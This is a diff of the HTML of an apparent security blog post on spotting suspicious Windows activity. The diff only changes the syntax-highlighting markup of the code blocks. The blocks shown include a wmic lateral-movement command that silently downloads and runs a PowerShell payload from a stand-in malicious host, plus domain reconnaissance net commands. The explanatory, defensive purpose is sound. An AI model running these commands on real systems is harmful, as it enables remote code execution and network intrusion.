@@ -140,7 +140,7 @@ Remote PowerShell execution used in enterprise environments.</p>
 <li>PowerShell can then download a payload, and finally <code>wmic.exe</code> is used for the <strong>lateral movement</strong>.</li>
 </ul>
 <p>Here’s an example command that might be executed via <code>wmic.exe</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>wmic /node<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;10.0.0.12&#34;</span> <span style="color:#66d9ef">process</span> call create <span style="color:#e6db74">&#34;powershell -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString(&#39;http://malicious.site/payload.ps1&#39;)&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wmic /node:<span style="color:#e6db74">&#34;10.0.0.12&#34;</span> process call create <span style="color:#e6db74">&#34;powershell -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString(&#39;http://malicious.site/payload.ps1&#39;)&#34;</span>
 </span></span></code></pre></div><ul>
 <li><code>/node:&quot;10.0.0.12&quot;</code> → Targets another machine on the network.</li>
 <li><code>process call create</code> → Asks that machine to run a new process.</li>
@@ -161,10 +161,10 @@ Remote PowerShell execution used in enterprise environments.</p>
 <hr>
 <h4 id="4-suspicious-recon-activity">4. Suspicious Recon Activity<a hidden class="anchor" aria-hidden="true" href="#4-suspicious-recon-activity">#</a></h4>
 <p>These commands are often used to <strong>map the network</strong> and <strong>identify valuable targets</strong>:</p>
-<pre tabindex="0"><code>net view /domain
-net use
-net group &#34;Domain Admins&#34; /domain
-</code></pre><p>They aren’t commands a normal user would ever run, and they often precede lateral movement.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net view /domain
+</span></span><span style="display:flex;"><span>net use
+</span></span><span style="display:flex;"><span>net group <span style="color:#e6db74">&#34;Domain Admins&#34;</span> /domain
+</span></span></code></pre></div><p>They aren’t commands a normal user would ever run, and they often precede lateral movement.</p>
 <hr>
 
 
